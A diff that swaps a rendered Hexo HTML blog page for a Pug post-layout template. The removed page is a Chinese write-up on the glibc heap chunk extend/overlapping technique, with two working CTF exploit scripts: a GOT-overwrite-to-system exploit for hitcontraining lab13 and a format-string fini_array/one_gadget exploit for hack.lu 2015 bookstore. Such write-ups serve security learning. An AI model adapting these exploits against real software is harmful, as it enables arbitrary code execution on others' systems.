@@ -1,309 +1,107 @@
-<!DOCTYPE HTML>
-<html class="no-js" lang="zh-CN">
-<!--
-//                            _ooOoo_
-//                           o8888888o
-//                           88" . "88
-//                           (| -_- |)
-//                            O\ = /O
-//                        ____/`---'\____
-//                      .   ' \\| |// `.
-//                       / \\||| : |||// \
-//                     / _||||| -:- |||||- \
-//                       | | \\\ - /// | |
-//                     | \_| ''\---/'' | |
-//                      \ .-\__ `-` ___/-. /
-//                   ___`. .' /--.--\ `. . __
-//                ."" '< `.___\_<|>_/___.' >'"".
-//               | | : `- \`.;`\ _ /`;.`/ - ` : | |
-//                 \ \ `-. \_ __\ /__ _/ .-` / /
-//         ======`-.____`-.___\_____/___.-`____.-'======
-//                            `=---='
-//                 拦截插件累计拦截逗比攻击"1381438"次！
-//         .............................................
-//                  佛祖保佑             永无BUG
-//          佛曰:
-//                  写字楼里写字间，写字间里程序员；
-//                  程序人员写程序，又拿程序换酒钱。
-//                  酒醒只在网上坐，酒醉还来网下眠；
-//                  酒醉酒醒日复日，网上网下年复年。
-//                  但愿老死电脑间，不愿鞠躬老板前；
-//                  奔驰宝马贵者趣，公交自行程序员。
-//                  别人笑我忒疯癫，我笑自己命太贱；
-//                  不见满街漂亮妹，哪个归得程序员？
--->
-<head><meta name="generator" content="Hexo 3.8.0">
-    <!--[if lte IE 9]>
-<meta http-equiv="refresh" content="0;url=http://yoursite.com/warn.html">
-<![endif]-->
-<meta charset="utf-8">
+extends includes/layout.pug
 
-<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+block top_img
+  - var top_img = page.top_img || theme.post_meta.top_img || theme.top_img || config.top_img
+  if (top_img && page.top_img !== false)
+    - var bg_img = top_img !== true ? `background-image: url(${top_img})` : ''
+    - var flag = top_img === true ? 'no-bg' : ''
+    div#top-container(style=bg_img class=flag)
+      include ./includes/header.pug
+      #post-info
+        #post-title= page.title || _p('no_title')
+        #post-meta
+          if (theme.post_meta.date_type)
+            if (theme.post_meta.date_type === 'both')
+              time.post-meta__date
+                i.fa.fa-calendar(aria-hidden="true")
+                =' '+_p('post.created')+' '+date(page.date, config.date_format)
+                span.post-meta__separator |
+                i.fa.fa-calendar-check-o(aria-hidden="true")
+                =' '+_p('post.updated')+' '+date(page.updated, config.date_format)
+            else
+              - var date_type = theme.post_meta.date_type === 'updated' ? 'updated' : 'date'
+              time.post-meta__date #[i.fa.fa-calendar(aria-hidden="true")] #[=date(page[date_type], config.date_format)]
+          if (theme.post_meta.categories && page.categories.data.length > 0)
+            if (theme.post_meta.date_type)
+              span.post-meta__separator |
+            each item, index in page.categories.data
+              i.fa.fa-inbox.post-meta__icon(aria-hidden="true")
+              a(href=url_for(item.path)).post-meta__categories #[=item.name]
+              if (index < page.categories.data.length - 1)
+                 i.fa.fa-angle-right(aria-hidden="true")
+          if (theme.disqus.enable && theme.disqus.count)
+            if (theme.post_meta.date_type || theme.post_meta.categories && page.categories.data.length > 0)
+              span.post-meta__separator |
+            i.fa.fa-comment-o.post-meta__icon(aria-hidden="true")
+            a(href=url_for(page.path) + '#disqus_thread')
+              span.disqus-comment-count(data-disqus-identifier=page.path)
+          if (theme.wordcount && theme.wordcount.enable)
+            .post-meta-wordcount
+              span= _p('post.wordcount') + ': '
+              span.word-count= wordcount(page.content)
+              span.post-meta__separator |
+              span= _p('post.min2read', min2read(page.content, {cn: 350, en: 160}))
+  else
+    div#top-container.plain
+      include ./includes/header.pug
 
-<meta http-equiv="X-UA-Compatible" content="IE=Edge">
-<meta name="renderer" content="webkit">
-<meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=no">
-<meta http-equiv="mobile-agent" content="format=html5; url=http://yoursite.com">
-<meta name="author" content="treebacker">
-<link rel="stylesheet" href="../../../../css/SimpleStyle.min.css">
-
-<link rel="shortcut icon" href="../../../../images/favicon.png">
-
-
-<title>堆漏洞chunk_extend_overlapping - Watch Security</title>
-
-<meta name="keywords" content="Reverse, Security, New">
-
-<meta name="description " content="">
-
-</head>
-<body>
-<div id="nav">
-    <nav class="nav-menu">
-        <a class="site-name current" href="/" title="Tree">Tree</a>
-        <a class="site-index current" href="/"><i class="fa fa-home"></i><span>首页</span></a>
-        <a href="/archives" title="归档"><i class="fa fa-archives"></i><span>归档</span></a>
-        <a href="/tags" title="标签"><i class="fa fa-tags"></i><span>标签</span></a>
-        <!-- custom single page of menus -->
-        
-        
-        <a href="/help" title="帮助">
-            <i class="fa fa-question-circle"></i>
-            <span>帮助</span>
-        </a>
-        
-    </nav>
-</div>
-
-<div class="nav-user">
-    <a class="btn-search" href="#"><i class="fa fa-search"></i></a>
-    <a class="btn-read-mode" href="#"><i class="fa fa-sun-o"></i></a>
-    <a class="btn-sns-qr" href="javascript:"><i class="fa fa-telegram"></i></a>
-</div>
-
-<div id="wrapper" class="clearfix">
-    <div id="body">
-        <div class="main" id="main">
-            <div id="cover">
-    <div class="cover-img"></div>
-    <div class="cover-info">
-        
-        <h1 class="cover-siteName">Treebacker</h1>
-        <h3 class="cover-siteTitle">愿麦子和麦子长在一起，愿河流与河流流归一处。</h3>
-        <p class="cover-siteDesc">岁月易逝，痕影难觅</p>
-        <div class="cover-sns">
-            
-            <div class="btn btn-github">
-                <a href="https://github.com/treebacker" target="_blank" title="github" ref="friend">
-                    <i class="fa fa-github"></i>
-                </a>
-            </div>
-            
-        </div>
-    </div>
-</div>
-            <div class="page-title">
-    <ul>
-        <li><a href="/">最新</a></li>
-        
-            
-                <li class="active">
-                    <a href="/categories/tech-notes" data-name="技术">技术</a>
-                </li>
-            
-                <li class="">
-                    <a href="/categories/essays" data-name="随笔">随笔</a>
-                </li>
-            
-                <li class="">
-                    <a href="/categories/cdcitizen-of-the-sun" data-name="海子">海子</a>
-                </li>
-            
-                <li class="">
-                    <a href="/categories/others" data-name="其他">其他</a>
-                </li>
-            
-        
-        <li class="page-search">
-    <form id="search" class="search-form">
-        <label for="s" class="sr-only">请输入关键字</label>
-        <input class="search-field" type="text" name="s" placeholder="请输入关键字">
-        <button type="submit" class="search-form-submit" title="搜索"><i class="fa fa-search"></i></button>
-    </form>
-    <div class="ins-search">
-    <div class="ins-search-mask"></div>
-    <div class="ins-search-container">
-        <div class="ins-input-wrapper">
-            <input type="text" class="ins-search-input" placeholder="请输入关键词...">
-            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
-        </div>
-        <div class="ins-section-wrapper">
-            <div class="ins-section-container"></div>
-        </div>
-    </div>
-</div>
-<script>
-(function (window) {
-    var INSIGHT_CONFIG = {
-        TRANSLATION: {
-            POSTS: '文章',
-            PAGES: '页面',
-            CATEGORIES: '分类',
-            TAGS: '标签',
-            UNTITLED: '(无标题)',
-        },
-        ROOT_URL: '/',
-        CONTENT_URL: '../../../../content.json',
-    };
-    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
-})(window);
-</script>
-</li>
-
-    </ul>
-</div>
-<div class="main-inner">
-    <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
-        <div class="post-header">
-            <div class="post-author clearfix">
-                <a class="avatar fleft" href="" target="_blank">
-                    <img width="48" src="/images/favicon.png" alt="avatar">
-                </a>
-                <p><span class="label">作者</span>
-                    <a href="" target="_blank">Treebacker</a>
-                    <span title="最后编辑于2019-09-17">2019-09-17</span>
-                </p>
-                <p></p>
-            </div>
-            <h2 class="post-title">堆漏洞chunk_extend_overlapping</h2>
-            <div class="post-meta">
-                本文总共3073个字 | 您是第<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>位看到它们的小伙伴
-            </div>
-        </div>
-        <div class="post-content markdown-body">
-            <h3 id="chunk-Extend-Overlapping"><a href="#chunk-Extend-Overlapping" class="headerlink" title="chunk Extend  Overlapping"></a>chunk Extend  Overlapping</h3><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><ul>
-<li>glibc管理的特点，chunk的header域(prev_size和size)和我们的data连续</li>
-<li>在寻找下一个chunk和上一个chunk时，均利用prev_size和size参与计算寻址</li>
-<li>所以如果可以伪造header域，就可以变相的控制chunk的管理，当chunk内有重要数据段或者指针的时候，就可以改变程序的执行流程。</li>
-</ul>
-<h4 id="结合漏洞"><a href="#结合漏洞" class="headerlink" title="结合漏洞"></a>结合漏洞</h4><ul>
-<li>一般结合堆溢出(off by one)</li>
-</ul>
-<h4 id="实例练习"><a href="#实例练习" class="headerlink" title="实例练习"></a>实例练习</h4><ul>
-<li><h4 id="hitcontraning-lab13"><a href="#hitcontraning-lab13" class="headerlink" title="hitcontraning_lab13"></a>hitcontraning_lab13</h4><ul>
-<li><p>漏洞分析</p>
-<ul>
-<li><p>基本功能，note结构和content域，note结构存有content域，可写</p>
-<img src="/2019/09/17/堆漏洞chunk-extend-overlapping/1.png" title="[]">
-</li>
-<li><p>off by one漏洞，在edit功能里</p>
-<img src="/2019/09/17/堆漏洞chunk-extend-overlapping/2.png" title="[]">
-</li>
-</ul>
-</li>
-<li><p>利用分析</p>
-<ul>
-<li><p>可以利用off by one改写chunk的header从而，伪造chunk大小为两个chunk，free后申请同样的大小chunk，就可以实现控制另一个被包含的chunk。</p>
-</li>
-<li><p>具体如下图。就是利用fastbin的malloc机制，使得note1成为原来的content1，content1成为原来的note0，且content0包含note1，即可以编辑note1，达到任意地址写的目的。</p>
-<img src="/2019/09/17/堆漏洞chunk-extend-overlapping/3.png" title="[]">
-</li>
-</ul>
-</li>
-<li><p>exp记录</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x18</span>, <span class="string">'a'</span>*<span class="number">4</span>)	<span class="comment">#0</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">'b'</span>*<span class="number">4</span>)	<span class="comment">#1</span></span><br><span class="line"><span class="comment">#fake chunk1' size</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">'/bin/sh\x00'</span>.ljust(<span class="number">0x10</span>, <span class="string">'a'</span>)+ p64(<span class="number">0x20</span>) + p64(<span class="number">0x41</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p, 'b* 0x400D76')</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#malloc the fake chunk</span></span><br><span class="line"><span class="comment">#fake_chunk' note = content1</span></span><br><span class="line"><span class="comment">#fake_chunk'content = note1</span></span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">create(<span class="number">0x30</span>, <span class="string">'c'</span>*<span class="number">0x20</span> + p64(<span class="number">0x30</span>) + p64(free_got))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Content : '</span>)</span><br><span class="line">free_addr = u64(p.recvline().strip(<span class="string">'\x0a'</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">libc_base = free_addr - libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    </span><br><span class="line"><span class="keyword">print</span> <span class="string">"system ==&gt; "</span> + hex(system_addr)</span><br><span class="line">    </span><br><span class="line">edit(<span class="number">1</span>, p64(system_addr))</span><br><span class="line">delete(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
-</li>
-<li><h4 id="2015-hacklu-bookstore"><a href="#2015-hacklu-bookstore" class="headerlink" title="2015_hacklu_bookstore"></a>2015_hacklu_bookstore</h4><ul>
-<li><h5 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><ul>
-<li><p>堆溢出</p>
-
-</li>
-<li><p>格式化字符串漏洞</p>
-
-</li>
-</ul>
-</li>
-<li><p>漏洞利用</p>
-<ul>
-<li><p>堆溢出可以overlapping，从而能够伪造dest，实现格式化字符串漏洞的利用。</p>
-</li>
-<li><p>但是由于需要泄露地址，程序的submit之后便退出。所以还需要覆写返回地址为main。这里学到新技能，即程序在运行mian前会执行init_array数组里面的函数，退出main之后，会执行fini_array数组里的函数。所以这里用到了覆盖fini_array[0]的方法达到漏洞重复利用的目的（只可一次，因为栈帧结构的破坏）。另外，由于fini_array的地址不在栈上，所以需要在输入选项的时候将该地址输入到stack上，找到正确的偏移即可。</p>
-</li>
-<li><p>IDA可能找不到init_array和fini_array，可以用objdump -h找到。</p>
-<img src="/2019/09/17/堆漏洞chunk-extend-overlapping/4.png" title="[]">
-</li>
-<li><p>泄露地址之后，一般选择再一次格式化字符串，用system_addr覆盖free_got，但是这里实际不会调用free，所以需要考虑one_gadget覆盖mian的返回地址。（这个地址是栈地址，存放着main的返回地址，需要调试发现，覆盖时只需要覆盖低三个byte即可）</p>
-<img src="/2019/09/17/堆漏洞chunk-extend-overlapping/5.png" title="[]">
-</li>
-</ul>
-</li>
-<li><p>exp记录</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">fini_array0 = <span class="number">0x6011b8</span>		<span class="comment">#0x400830</span></span><br><span class="line">again_addr = <span class="number">0x400a39</span>		<span class="comment">#only 1.5 byte differs</span></span><br><span class="line">payload = <span class="string">'%'</span> + str(<span class="number">0xa39</span><span class="number">-12</span>) + <span class="string">"c%13$hn"</span> + <span class="string">"+%31$p"</span> + <span class="string">"?%28$p"</span></span><br><span class="line"></span><br><span class="line">      </span><br><span class="line">edit_1(payload.ljust(<span class="number">0x80</span>, <span class="string">'a'</span>) + p64(<span class="number">0x00</span>) + p64(<span class="number">0x151</span>))													<span class="comment">#malloc(0x80)</span></span><br><span class="line">gdb.attach(p, <span class="string">'b* 0x400AF0'</span>)</span><br><span class="line">dbg()</span><br><span class="line">edit_2(<span class="string">'b'</span>*<span class="number">0x140</span> + p64(<span class="number">0x150</span>) + p64(<span class="number">0x21</span>) + <span class="string">'a'</span>*<span class="number">0x10</span> + p64(<span class="number">0x20</span>) + p64(<span class="number">0x21</span>))					<span class="comment">#malloc(0x80)   =&gt; malloc(0x140)</span></span><br><span class="line">delete_2()</span><br><span class="line">submit(p64(fini_array0))</span><br><span class="line">p.recvuntil(<span class="string">'+'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'+'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'+'</span>)</span><br><span class="line">__libc_start_main_addr = int(p.recv(<span class="number">14</span>), <span class="number">16</span>) - <span class="number">240</span></span><br><span class="line">libc_base = __libc_start_main_addr - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x45216</span></span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">ret_addr = int(p.recv(<span class="number">14</span>), <span class="number">16</span>) - <span class="number">0xd8</span> - <span class="number">0x110</span></span><br><span class="line">      </span><br><span class="line"><span class="keyword">print</span> <span class="string">'system ==&gt; '</span> + hex(system_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"ret_addr ==&gt; "</span> + hex(ret_addr)</span><br><span class="line">      </span><br><span class="line">      </span><br><span class="line">cover_1 = <span class="string">'0x'</span> + str(hex(one_gadget))[<span class="number">-2</span>:]</span><br><span class="line">cover_2 = <span class="string">'0x'</span> + str(hex(one_gadget))[<span class="number">-6</span>:<span class="number">-2</span>]</span><br><span class="line">      </span><br><span class="line">cover_1 = int(cover_1, <span class="number">16</span>)</span><br><span class="line">cover_2 = int(cover_2, <span class="number">16</span>)</span><br><span class="line">      </span><br><span class="line">payload = <span class="string">'%'</span> + str(cover_1<span class="number">-12</span>) + <span class="string">'d%13$hhn'</span></span><br><span class="line">payload += <span class="string">'%'</span> + str(cover_2 - cover_1) + <span class="string">'d%14$hn'</span></span><br><span class="line">      </span><br><span class="line">edit_1(payload.ljust(<span class="number">0x80</span>, <span class="string">'a'</span>) + p64(<span class="number">0x00</span>) + p64(<span class="number">0x151</span>))</span><br><span class="line">edit_2(<span class="string">'b'</span>*<span class="number">0x140</span> + p64(<span class="number">0x150</span>) + p64(<span class="number">0x21</span>) + <span class="string">'a'</span>*<span class="number">0x10</span> + p64(<span class="number">0x20</span>) + p64(<span class="number">0x21</span>))					<span class="comment">#malloc(0x80)   =&gt; malloc(0x140)</span></span><br><span class="line">delete_2()</span><br><span class="line">submit(p64(ret_addr) + p64(ret_addr+<span class="number">1</span>))</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<p><a href="https://sirhc.gitbook.io/note/pwn/zhong-xie-.finiarray-han-shu-zhi-zhen" target="_blank" rel="noopener">关于init_array，fini_array</a></p>
-<p><a href="https://blog.csdn.net/qq_43449190/article/details/89077783" target="_blank" rel="noopener">解题参考</a></p>
-
-        </div>
-        <div class="post-tool">
-            <a class="btn-thumbs-up" href="javascript:void(0);" data-cid="52" title="95">
-                <i class="fa fa-thumbs-up" aria-hidden="true"></i> 打赏
-            </a>
-        </div>
-        
-        <div class="post-tags">标签：
-            
-        </div>
-        
-    </article>
-    
-    <p>本文代表个人观点，内容仅供参考。若有不恰当之处，望不吝赐教！</p>
-    
-    
-</div>
-<script src="../../../../js/busuanzi.pure.mini.js"></script>
-
-        </div><!-- end #main-->
-    </div><!-- end #body -->
-    <footer class="footer">
-    <div class="footer-inner">
-        <p>
-            <a href="/about" title="关于本站">关于本站</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
-            <!-- 自定义链接 -->
-            <a href="/help" title="help">急救中心</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
-            <a href="/app" title="App下载">App下载</a>
-        </p>
-        <p>
-            本站点采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a>，已建立<a href="/timeline" id="siteBuildingTime"></a>天<br>
-            ©2017 基于<a href="http://hexo.io" target="_blank">Hexo</a>搭建
-            ，主题&nbsp<a href="https://github.com/tangkunyin/hexo-theme-jsimple" target="_blank">JSimple</a>
-            ，作者<a href="https://www.tangkunyin.com" target="_blank">唐先森</a>
-            ，Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a>
-        </p>
-        
-
-    </div>
-</footer>
-<script src="../../../../js/InsightSearch.js"></script>
-<script src="../../../../js/SimpleCore.js"></script>
-
-</div>
-<div class="fixed-btn">
-    <a class="btn-gotop" href="javascript:"> <i class="fa fa-angle-up"></i></a>
-</div>
-<script>
-    $(function () {
-        SimpleCore.init({
-            buildingTime: '11/22/2018',
-            current: $('.post-tags').length > 0 ? 'post' : 'archive',
-            snsQRCode: '/images/sns-qrcode.png',
-            donateImg: '/images/donate-qr.png',
-        });
-    });
-</script>
-</body>
-</html>
+block content
+  article#post(class="")
+    if (!top_img)
+      #post-title.plain= page.title || _p('no_title')
+      #post-meta
+        if (theme.post_meta.date_type)
+          - var date_type = theme.post_meta.date_type === 'updated' ? '' : 'date'
+          time.post-meta__date #[i.fa.fa-calendar(aria-hidden="true")] #[=date(page[date_type], config.date_format)]
+        if (theme.post_meta.categories && page.categories.data.length > 0)
+          if (theme.post_meta.date_type)
+            span.post-meta__separator |
+          each item, index in page.categories.data
+            i.fa.fa-inbox(aria-hidden="true")
+            a(href=url_for(item.path)).post-meta__categories  #[=item.name]
+            if (index < page.categories.data.length - 1)
+                i.fa.fa-angle-right.post-meta__separator(aria-hidden="true")
+        if (theme.disqus.enable && theme.disqus.count)
+          if (theme.post_meta.date_type || theme.post_meta.categories && page.categories.data.length > 0)
+            span.post-meta__separator |
+          i.fa.fa-comment-o(aria-hidden="true")
+          a(href=url_for(page.path) + '#disqus_thread')
+            span.disqus-comment-count(data-disqus-identifier=page.path)
+        if (theme.wordcount && theme.wordcount.enable)
+          span.post-meta__separator |
+          span.post-meta-wordcount
+            span= _p('post.wordcount') + ': '
+            span.word-count= wordcount(page.content)
+            span.post-meta__separator |
+            span= _p('post.min2read', min2read(page.content, {cn: 350, en: 160}))
+    #post-content.article-container!= page.content
+  if (theme.post_copyright && theme.post_copyright.enable)
+    .post-copyright
+      .post-copyright__author
+        span.post-copyright-meta= _p('post.copyright.author') + ": "
+        span.post-copyright-info
+          a(href=`mailto:${config.email}`) #[=config.author]
+      .post-copyright__type
+        span.post-copyright-meta= _p('post.copyright.link') + ": "
+        span.post-copyright-info
+          a(href=url_for(page.permalink)) #[=page.permalink]
+      .post-copyright__notice
+        span.post-copyright-meta= _p('post.copyright.copyright_notice') + ": "
+        span.post-copyright-info!= _p('post.copyright.copyright_content', theme.post_copyright.license_url, theme.post_copyright.license, config.url, config.title)
+  if (theme.post_meta.tags)
+    .post-meta__tag-list
+      each item, index in page.tags.data
+        a(href=url_for(item.path)).post-meta__tags #[=item.name]
+  if (theme.QR_code)
+    if (theme.QR_code.length > 0)
+      .post-qr-code
+        each item in theme.QR_code
+          .post-qr-code-item
+            img.post-qr-code__img(src=(item.itemlist||item).img)
+            .post-qr-code__desc=(item.itemlist||item).text
+  include includes/share/index.pug
+  include includes/pagination.pug
+  if (theme.adv && theme.adv.enable)
+    .post-adv!= theme.adv.info
+  if page.comments !== false
+    include includes/comments/index.pug
